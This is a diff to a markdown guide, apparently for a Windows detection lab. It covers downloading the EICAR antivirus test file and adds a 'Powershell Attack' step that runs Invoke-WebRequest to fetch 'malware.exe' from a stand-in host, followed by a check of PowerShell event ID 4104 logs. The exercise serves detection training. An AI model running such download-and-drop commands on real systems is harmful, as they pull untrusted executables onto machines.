@@ -8,7 +8,7 @@ See `Brute_Force_incident_report.md` for the full report. Additionally, to see h
 
 ### Steps
 + **Open Browser on the Windows VM**
-+ Visit the official EICAR test file site (Please see **Image 1**)
++ Visit the official EICAR test file site (Please see **Image 1** )
   🔗 [https://www.eicar.org/download-anti-malware-tesfile/](https://www.eicar.org/download-anti-malware-tesfile/)
 + Download the `eicar.com` file - your antivirus or Windows Defender will likely alert or block it (Please see **Image 1**).
   #### Alternative way to download if it is blocked (Manual Method) (Please see **Image 2**)
@@ -51,6 +51,15 @@ See `Brute_Force_incident_report.md` for the full report. Additionally, to see h
 | 5007    | Settings changed      |
 
 ## 🧨Powershell Attack
+### Steps
++ **Open PowerShell as Administrator on the Windows VM**
++ Run the following harmless but suspicious command:
 
-     
+  ```spl
   
+  Invoke-WebRequest -Uri "http://test.com/malware.exe" -OutFile "C:\Users\Public\Downloads\malware.exe"
+  ```
+  + Check **Windows Event Viewer** under:
+    + ` Windows Event Viewer → Applications and Services Logs → Microsoft → Windows → Powershell → Operational`
+    + Event ID: `4104` (script block logging)
+
